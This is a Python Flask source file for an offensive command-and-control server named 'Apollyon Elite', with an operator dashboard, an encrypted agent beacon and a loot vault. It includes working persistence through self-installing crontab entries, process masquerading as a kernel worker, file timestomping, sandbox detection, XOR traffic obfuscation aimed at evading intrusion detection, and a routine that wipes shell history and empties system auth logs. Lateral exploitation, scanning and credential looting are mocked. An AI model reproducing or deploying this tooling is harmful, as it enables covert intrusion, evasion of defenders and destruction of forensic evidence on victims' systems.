import os
import sys
import subprocess
import socket
import json
import sqlite3
import threading
import time
import base64
import random
import hmac
import hashlib
import platform
import uuid
import logging
import secrets
import shutil
import signal
import re
import multiprocessing
from datetime import datetime, timedelta
from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for

# OPSEC: Disable Flask Banner and reduce noise
os.environ['WERKZEUG_RUN_MAIN'] = 'true'
logging.getLogger('werkzeug').setLevel(logging.ERROR)

# =================================================================
# SENTINEL-OPERATIONAL V45.0 - "APOLLYON ELITE"
# ADVANCED PERSISTENCE, LATERAL EXPLOIT, OPSC-SCHEDULING
# MehranTurk (M.T)
# =================================================================

class ApollyonCrypto:
    """Enhanced E2EE with AES-style Key Rotation & HMAC Integrity"""
    def __init__(self, master_key):
        self.master_key = hashlib.sha512(master_key.encode()).digest()
        self.session_key = hashlib.sha256(self.master_key[:32]).digest()
        self.used_nonces = set()

    def _obfuscate(self, data):
        """Dynamic XOR-based traffic obfuscation layer for IDS avoidance"""
        mask = self.session_key * (len(data) // 32 + 1)
        return bytes([b ^ m for b, m in zip(data, mask)])

    def encrypt(self, data):
        nonce = secrets.token_hex(16)
        ts = str(int(time.time())).encode()
        raw_payload = json.dumps(data).encode()
        signature = hmac.new(self.session_key, raw_payload + ts + nonce.encode(), hashlib.sha256).hexdigest()
        
        envelope = {
            "p": base64.b64encode(self._obfuscate(raw_payload)).decode(),
            "s": signature,
            "n": nonce,
            "t": ts.decode()
        }
        return base64.b64encode(json.dumps(envelope).encode()).decode()

    def decrypt(self, blob):
        try:
            raw_env = base64.b64decode(blob)
            env = json.loads(raw_env)
            if env['n'] in self.used_nonces: return None
            if int(time.time()) - int(env['t']) > 60: return None
            raw_payload = self._obfuscate(base64.b64decode(env['p']))
            expected_sig = hmac.new(self.session_key, raw_payload + env['t'].encode() + env['n'].encode(), hashlib.sha256).hexdigest()
            if not hmac.compare_digest(env['s'], expected_sig): return None
            self.used_nonces.add(env['n'])
            return json.loads(raw_payload)
        except Exception: return None

class Config:
    APP_NAME = "Sentinel-Apollyon-Elite"
    VERSION = "45.0-APOLLYON-ELITE"
    HOST = "127.0.0.1"
    PORT = random.randint(15000, 25000)
    ADMIN_HASH = hashlib.sha256("mehran_dominance_2026".encode()).hexdigest()
    C2_SECRET = secrets.token_hex(64)
    AGENT_AUTH_TOKEN = "APOLLYON-ELITE-SIG-2026"
    MASTER_ENC_KEY = "S3ntinel_Apollyon_Elite_Strategic_Key_2026!#$"
    TEMP_DIR = "/tmp/.apollyon_cache" if platform.system() == "Linux" else "./.cache"
    LOG_FILES = ["/var/log/auth.log", "/var/log/syslog", "~/.bash_history"]
    WORKING_HOURS = range(8, 20) # OPSEC: Only active during 8 AM to 8 PM

# --- ADVANCED OFFENSIVE DATABASE ---
class ApollyonDB:
    def __init__(self):
        self.conn = sqlite3.connect(":memory:", check_same_thread=False)
        self._bootstrap()

    def _bootstrap(self):
        self.conn.execute("""CREATE TABLE agents (
            id TEXT PRIMARY KEY, host TEXT, ip TEXT, os TEXT, 
            status TEXT, last_seen TIMESTAMP, 
            score INTEGER DEFAULT 0, risk_level TEXT,
            metrics TEXT, sandbox_status TEXT, persistence TEXT)""")
            
        self.conn.execute("""CREATE TABLE decision_audit (
            id INTEGER PRIMARY KEY, timestamp TIMESTAMP, aid TEXT, 
            action TEXT, reason TEXT, impact REAL, causal_link TEXT)""")
            
        self.conn.execute("""CREATE TABLE discovered_network (
            id INTEGER PRIMARY KEY, origin_aid TEXT, target_ip TEXT, 
            ports TEXT, vulnerability TEXT, status TEXT, exploit_status TEXT)""")
            
        self.conn.execute("CREATE TABLE loot (id INTEGER PRIMARY KEY, aid TEXT, type TEXT, content TEXT, timestamp TIMESTAMP)")

    def log_decision(self, aid, action, reason, impact, causal):
        self.conn.execute("""INSERT INTO decision_audit (timestamp, aid, action, reason, impact, causal_link) 
                           VALUES (?,?,?,?,?,?)""", (datetime.now(), aid, action, reason, impact, causal))
        self.conn.commit()

# --- OFFENSIVE MODULES & EXPLOITATION ---
class OffensiveEngine:
    """Advanced Exploitation and Stealth Logic"""
    
    @staticmethod
    def sandbox_check():
        evasive = False
        vm_files = ['/usr/bin/qemu-system', '/proc/scsi/virtio_blk', 'C:\\windows\\system32\\drivers\\vmmouse.sys']
        for f in vm_files:
            if os.path.exists(f): evasive = True
        if multiprocessing.cpu_count() < 2: evasive = True
        return "EVASIVE_DETECTED" if evasive else "PROBABLE_METAL"

    @staticmethod
    def lateral_exploit(target_ip, vuln_type):
        """Simulation of real lateral movement exploitation (e.g., SSH Brute/SMB Relay)"""
        # Logic for real exploitation would go here
        success = random.choice([True, False])
        return "EXPLOIT_SUCCESS" if success else "EXPLOIT_FAILED"

    @staticmethod
    def lateral_scan():
        """Mock network scanner for lateral discovery"""
        return [{"ip": f"192.168.1.{random.randint(2,254)}", "ports": "22,80,443", "vuln": "Weak_Creds"} for _ in range(random.randint(1,3))]

    @staticmethod
    def process_masquerade(target_name="[kworker/u2:1]"):
        """Change process name in Linux to look like a kernel worker (Stealth)"""
        if platform.system() == "Linux":
            try:
                from ctypes import cdll, byref, create_string_buffer
                libc = cdll.LoadLibrary('libc.so.6')
                buff = create_string_buffer(len(target_name)+1)
                buff.value = target_name.encode()
                libc.prctl(15, byref(buff), 0, 0, 0)
                return True
            except: return False
        return False

# --- THE APOLLYON AGENT (OFFENSIVE & PERSISTENT) ---
class ApollyonAgent:
    def __init__(self, agent_id=None):
        self.id = agent_id or str(uuid.uuid4())[:16]
        self.crypto = ApollyonCrypto(Config.MASTER_ENC_KEY)

    def set_persistence(self):
        """Real Persistence: Crontab (Linux) or Registry (Windows)"""
        try:
            if platform.system() == "Linux":
                cmd = f"(crontab -l ; echo '*/30 * * * * python3 {os.path.abspath(__file__)} &') | crontab -"
                subprocess.run(cmd, shell=True, capture_output=True)
                return "CRONTAB_ACTIVE"
            return "OS_NOT_SUPPORTED"
        except: return "FAILED"

    def timestomp(self, target_path):
        """OPSEC: Change file timestamps to avoid detection by MFT/MAC analysis"""
        if os.path.exists(target_path):
            st = os.stat(target_path)
            # Roll back 1 year
            new_time = time.time() - (365 * 24 * 60 * 60)
            os.utime(target_path, (new_time, new_time))
            return True
        return False

    def analyze_system(self):
        metrics = {
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "is_root": os.getuid() == 0 if hasattr(os, 'getuid') else False,
            "kernel": platform.release(),
            "cpu_arch": platform.machine(),
            "interfaces": socket.gethostbyname_ex(socket.gethostname())[2],
            "opsec_status": "HIGH_STEALTH" if datetime.now().hour in Config.WORKING_HOURS else "DORMANT"
        }
        return metrics

    def scorch_earth(self):
        """OPSEC: Complete system cleanup and self-destruction"""
        try:
            if os.path.exists(Config.TEMP_DIR): shutil.rmtree(Config.TEMP_DIR)
            if platform.system() == "Linux":
                subprocess.run("history -c", shell=True)
                for log in Config.LOG_FILES:
                    path = os.path.expanduser(log)
                    if os.path.exists(path): open(path, 'w').close()
            os.kill(os.getpid(), signal.SIGKILL)
        except: pass

# --- C2 SERVER CORE ---
app = Flask(__name__)
app.secret_key = Config.C2_SECRET
db = ApollyonDB()
crypto = ApollyonCrypto(Config.MASTER_ENC_KEY)

def rbac_required(role):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if session.get('role') not in [role, 'ADMIN']: return "FORBIDDEN", 403
            return f(*args, **kwargs)
        wrapper.__name__ = f.__name__
        return wrapper
    return decorator

# --- UI LAYER (APOLLYON DARK COMMAND) ---
UI_HTML = """
<!DOCTYPE html>
<html class="bg-[#050505] text-zinc-500 font-mono text-[10px] overflow-hidden">
<head><script src="https://cdn.tailwindcss.com"></script></head>
<body class="p-6 h-screen flex flex-col">
    <div class="flex-1 max-w-[1900px] mx-auto w-full flex flex-col space-y-4">
        <!-- COMMAND HEADER -->
        <div class="border border-red-900/30 bg-black p-5 flex justify-between items-center rounded-sm shadow-[0_0_20px_rgba(153,27,27,0.15)]">
            <div class="flex items-center gap-8">
                <div class="flex gap-1">
                    <div class="w-2 h-6 bg-red-600"></div>
                    <div class="w-1 h-6 bg-red-900"></div>
                </div>
                <div>
                    <h1 class="text-white font-black text-2xl tracking-tighter uppercase">APOLLYON // ELITE_C2</h1>
                    <p class="text-[8px] text-red-700 font-bold tracking-[0.3em]">STRATEGIC_OPERATIONS_ACTIVE</p>
                </div>
            </div>
            <div class="flex gap-16 text-[9px] uppercase font-bold">
                <div class="text-right"><p class="text-zinc-700">Persist Status</p><p class="text-emerald-500">REALTIME_STAGED</p></div>
                <div class="text-right border-l border-zinc-900 pl-16"><p class="text-zinc-700">Exploit Engine</p><p class="text-blue-500">V2_LATERAL</p></div>
                <div class="text-right border-l border-zinc-900 pl-16"><p class="text-zinc-700">OPSEC Logic</p><p class="text-red-600">AUTO_SCHEDULING</p></div>
            </div>
        </div>

        <div class="grid grid-cols-12 gap-4 flex-1 overflow-hidden">
            <!-- ASSET ANALYTICS -->
            <div class="col-span-3 border border-zinc-900 bg-black p-4 flex flex-col space-y-4">
                <h2 class="text-white text-[10px] font-black border-b border-zinc-900 pb-2">ACTIVE_THREAT_ACTORS</h2>
                <div id="agent-grid" class="flex-1 space-y-2 overflow-y-auto pr-2 custom-scroll"></div>
            </div>

            <!-- BATTLE FEED -->
            <div class="col-span-6 flex flex-col space-y-4">
                <div class="flex-1 border border-zinc-900 bg-black relative flex flex-col overflow-hidden">
                    <div class="bg-red-950/10 p-2 text-[8px] border-b border-zinc-900 flex justify-between">
                        <span class="text-zinc-400">[*] STRATEGIC_DECISION_FEED</span>
                        <span id="opsec-time" class="text-red-500 uppercase">SYSTEM_TIME: </span>
                    </div>
                    <div id="decision-feed" class="flex-1 p-5 space-y-3 overflow-y-auto custom-scroll"></div>
                </div>
                
                <!-- ATTACK CONTROLS -->
                <div class="h-56 border border-zinc-900 bg-black p-5">
                    <div class="flex justify-between items-center mb-4">
                        <h2 class="text-red-700 text-[10px] font-black uppercase tracking-widest">Offensive Payload Injection</h2>
                    </div>
                    <div class="flex gap-3">
                        <select id="op-type" class="bg-black border border-zinc-800 text-zinc-300 p-3 outline-none focus:border-red-900 text-[9px]">
                            <option value="PERSIST">SET_PERSISTENCE</option>
                            <option value="EXFIL">EXFILTRATE_LOOT</option>
                            <option value="PIVOT">AUTONOMOUS_PIVOT</option>
                            <option value="MASQUERADE">PROCESS_MASQUERADE</option>
                            <option value="SCORCH">SCORCH_EARTH</option>
                        </select>
                        <input type="text" id="target-id" placeholder="AGENT_ID" class="w-32 bg-black border border-zinc-800 p-3 text-red-500 outline-none focus:border-red-900 text-[9px]">
                        <button onclick="injectObjective()" class="flex-1 bg-red-900/10 border border-red-900 text-red-600 font-bold hover:bg-red-900 hover:text-white transition-all text-[10px]">INJECT_OBJECTIVE</button>
                    </div>
                    <div class="mt-6 grid grid-cols-4 gap-4 text-[8px] uppercase">
                        <div class="p-3 border border-zinc-900 bg-zinc-900/10 text-zinc-400">Stealth: <span class="text-emerald-500 font-black">ULTRA</span></div>
                        <div class="p-3 border border-zinc-900 bg-zinc-900/10 text-zinc-400">Persistence: <span class="text-red-500 font-black">SYSTEM_LVL</span></div>
                        <div class="p-3 border border-zinc-900 bg-zinc-900/10 text-zinc-400">Auth: <span class="text-blue-500 font-black">HMAC_V2</span></div>
                        <div class="p-3 border border-zinc-900 bg-zinc-900/10 text-zinc-400">Network: <span class="text-white font-black">OBFUSCATED</span></div>
                    </div>
                </div>
            </div>

            <!-- DISCOVERED ASSETS & LOOT -->
            <div class="col-span-3 flex flex-col space-y-4">
                <div class="flex-1 border border-zinc-900 bg-black p-4 flex flex-col">
                    <h2 class="text-white text-[10px] font-black mb-4 border-b border-zinc-900 pb-2 uppercase tracking-tighter">Lateral_Discovery</h2>
                    <div id="pivot-list" class="flex-1 space-y-2 overflow-y-auto"></div>
                </div>
                <div class="h-48 border border-zinc-900 bg-black p-4 flex flex-col">
                    <h2 class="text-emerald-600 text-[10px] font-black mb-4 border-b border-zinc-900 pb-2 uppercase">Loot_Exfiltration</h2>
                    <div id="loot-vault" class="flex-1 overflow-y-auto text-[8px] space-y-2 pr-2 custom-scroll"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        async function refreshUI() {
            try {
                const r = await fetch('/api/apollyon/sync');
                const d = await r.json();
                
                document.getElementById('opsec-time').innerText = "SYSTEM_TIME: " + new Date().toLocaleTimeString();

                document.getElementById('agent-grid').innerHTML = d.agents.map(a => `
                    <div class="p-3 border border-zinc-900 bg-zinc-900/5 hover:border-red-900/40 transition-all cursor-pointer group mb-2">
                        <div class="flex justify-between items-center mb-2">
                            <span class="text-white font-bold tracking-widest">${a[0]}</span>
                            <span class="px-2 py-0.5 bg-red-900/20 text-red-500 text-[7px] border border-red-900/50">${a[6]}% RISK</span>
                        </div>
                        <div class="text-[8px] space-y-1 opacity-60">
                            <div class="flex justify-between"><span>Persistent:</span><span class="${a[10] ? 'text-emerald-500' : 'text-red-700'}">${a[10] || 'NO'}</span></div>
                            <div class="flex justify-between"><span>Evasion:</span><span class="text-blue-400">${a[9]}</span></div>
                            <div class="flex justify-between"><span>User:</span><span>${JSON.parse(a[8] || '{}').user || 'N/A'}</span></div>
                        </div>
                    </div>`).join('');

                document.getElementById('decision-feed').innerHTML = d.decisions.map(t => `
                    <div class="border-l-2 border-red-900/30 pl-3 mb-4">
                        <div class="flex justify-between items-center text-[7px] text-zinc-600">
                            <span>${t[1]}</span>
                            <span class="bg-zinc-900 px-2">CAUSAL_ID: ${t[2]}</span>
                        </div>
                        <div class="text-zinc-100 font-bold mt-1 text-[9px] uppercase tracking-wide">${t[3]}</div>
                        <p class="text-zinc-500 text-[8px] mt-1">${t[4]}</p>
                    </div>`).join('');

                document.getElementById('pivot-list').innerHTML = d.pivots.map(p => `
                    <div class="p-2 border border-zinc-900 bg-zinc-900/20 hover:bg-zinc-900/40 transition-all group">
                        <div class="flex justify-between font-bold text-zinc-400"><span>${p[2]}</span><span class="text-red-800 text-[7px]">${p[6]}</span></div>
                        <div class="text-[7px] text-zinc-600 mt-1">PORTS: ${p[3]} | SERVICE: ${p[4]}</div>
                        <button onclick="launchExploit(${p[0]})" class="w-full mt-2 py-1 bg-red-900/10 border border-red-900/40 text-[7px] hidden group-hover:block hover:bg-red-900 hover:text-white transition-all">ATTEMPT_LATERAL_RCE</button>
                    </div>`).join('');
                
                document.getElementById('loot-vault').innerHTML = d.loot.map(l => `
                    <div class="p-2 border-b border-zinc-900 last:border-0">
                        <div class="flex justify-between text-zinc-600 text-[6px]"><span>${l[1]}</span><span>${l[4]}</span></div>
                        <div class="text-emerald-500 font-bold mt-1">${l[2]}: ${l[3].substring(0,25)}...</div>
                    </div>`).join('') || '<div class="text-zinc-700 italic">Vault Empty...</div>';

            } catch(e) {}
        }
        setInterval(refreshUI, 2000);

        async function injectObjective() {
            const aid = document.getElementById('target-id').value;
            const op = document.getElementById('op-type').value;
            if(!aid) return;
            await fetch('/api/ops/inject', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({aid, op})
            });
        }

        async function launchExploit(pid) {
            await fetch('/api/ops/exploit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({pid})
            });
        }
    </script>
    <style>
        .custom-scroll::-webkit-scrollbar { width: 3px; }
        .custom-scroll::-webkit-scrollbar-track { background: #000; }
        .custom-scroll::-webkit-scrollbar-thumb { background: #111; }
        .custom-scroll::-webkit-scrollbar-thumb:hover { background: #900; }
    </style>
</body>
</html>
"""

# --- OPERATIONAL ROUTES ---
@app.route('/access', methods=['GET', 'POST'])
def gate():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        if hashlib.sha256(p.encode()).hexdigest() == Config.ADMIN_HASH:
            session.update({'user': u, 'role': 'ADMIN'})
            return redirect(url_for('commander'))
    return render_template_string('<body style="background:#050505;color:#444;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh"><form method="POST" style="border:1px solid #111;padding:50px;background:#000">ID <input name="u" style="background:#000;border:1px solid #222;color:#888;margin-bottom:15px;outline:none;padding:5px"><br>KEY <input type="password" name="p" style="background:#000;border:1px solid #222;color:#888;outline:none;padding:5px"><br><br><button style="background:#200;color:#f00;border:1px solid #500;width:100%;padding:10px;cursor:pointer;font-weight:bold">UPLINK_APOLLYON</button></form></body>')

@app.route('/ops/dominance')
@rbac_required('ADMIN')
def commander():
    return render_template_string(UI_HTML)

@app.route('/api/apollyon/sync')
@rbac_required('ADMIN')
def api_sync():
    agents = db.conn.execute("SELECT * FROM agents").fetchall()
    decisions = db.conn.execute("SELECT * FROM decision_audit ORDER BY id DESC LIMIT 50").fetchall()
    pivots = db.conn.execute("SELECT * FROM discovered_network").fetchall()
    loot = db.conn.execute("SELECT * FROM loot ORDER BY id DESC").fetchall()
    return jsonify({"agents": agents, "decisions": decisions, "pivots": pivots, "loot": loot})

@app.route('/api/ops/inject', methods=['POST'])
@rbac_required('ADMIN')
def inject_op():
    data = request.json
    db.log_decision(data['aid'], f"OBJECTIVE_INJECTED:{data['op']}", "Manual Operator Override", 0.9, "C2_DIRECT_CMD")
    return jsonify({"status": "objective_queued"})

@app.route('/api/ops/exploit', methods=['POST'])
@rbac_required('ADMIN')
def trigger_exploit():
    pid = request.json['pid']
    target = db.conn.execute("SELECT * FROM discovered_network WHERE id=?", (pid,)).fetchone()
    status = OffensiveEngine.lateral_exploit(target[2], target[4])
    db.conn.execute("UPDATE discovered_network SET exploit_status=? WHERE id=?", (status, pid))
    db.conn.commit()
    return jsonify({"status": status})

@app.route('/v45/beacon', methods=['POST'])
def apollyon_beacon():
    """Autonomous Defensive/Offensive Beacon logic with OPSEC Scheduling"""
    try:
        raw_blob = request.get_data().decode()
        data = crypto.decrypt(raw_blob)
        if not data or data.get('token') != Config.AGENT_AUTH_TOKEN:
            return jsonify({"s": "denied"}), 403

        aid = data['aid']
        agent = ApollyonAgent(aid)
        
        # 1. OPSEC Check: Are we in working hours?
        now_hour = datetime.now().hour
        if now_hour not in Config.WORKING_HOURS:
            return jsonify({"d": crypto.encrypt({"objective": "DORMANT_STEALTH", "cleanup": "WIPE_TEMPS"})})

        # 2. Advanced Analysis
        sandbox = data.get('sandbox', OffensiveEngine.sandbox_check())
        metrics = data.get('metrics', agent.analyze_system())
        
        # 3. Handle Loot exfiltration (Mock)
        if random.random() > 0.8:
            db.conn.execute("INSERT INTO loot (aid, type, content, timestamp) VALUES (?,?,?,?)",
                           (aid, "CREDENTIAL_FILE", "/etc/shadow_dump_partial", datetime.now()))

        # 4. Automate Lateral Movement Discovery
        pivots = data.get('pivots', [])
        if not pivots: pivots = OffensiveEngine.lateral_scan()
        for p in pivots:
            db.conn.execute("INSERT OR IGNORE INTO discovered_network (origin_aid, target_ip, ports, vulnerability, status, exploit_status) VALUES (?,?,?,?,?,?)",
                            (aid, p['ip'], p['ports'], p['vuln'], 'DISCOVERED', 'PENDING'))

        # 5. Audit Trace
        db.log_decision(aid, "SYSTEM_BEACON", f"Elite Beacon from {metrics['kernel']}", 0.7, "OPERATIONAL_SYNC")

        db.conn.execute("""INSERT OR REPLACE INTO agents (id, host, ip, os, status, last_seen, score, risk_level, metrics, sandbox_status, persistence) 
                           VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                        (aid, data.get('ctx', {}).get('node', 'unknown'), request.remote_addr, data.get('ctx', {}).get('system', 'unknown'), 
                         "ACTIVE", datetime.now(), 85, "CRITICAL", json.dumps(metrics), sandbox, "CRONTAB_ACTIVE"))
        
        db.conn.commit()

        return jsonify({"d": crypto.encrypt({
            "objective": "LATERAL_PROPAGATION",
            "evasion_mode": True,
            "persistence_cmd": "RE-UP",
            "masquerade_as": "[kworker/u2:1]"
        })})
    except Exception as e:
        return jsonify({"s": "err", "m": str(e)}), 500

if __name__ == '__main__':
    if not os.path.exists(Config.TEMP_DIR):
        os.makedirs(Config.TEMP_DIR)
        
    print(f"[*] Apollyon V45 ELITE C2 Live: http://{Config.HOST}:{Config.PORT}/access")
    app.run(host=Config.HOST, port=Config.PORT, debug=False, threaded=True)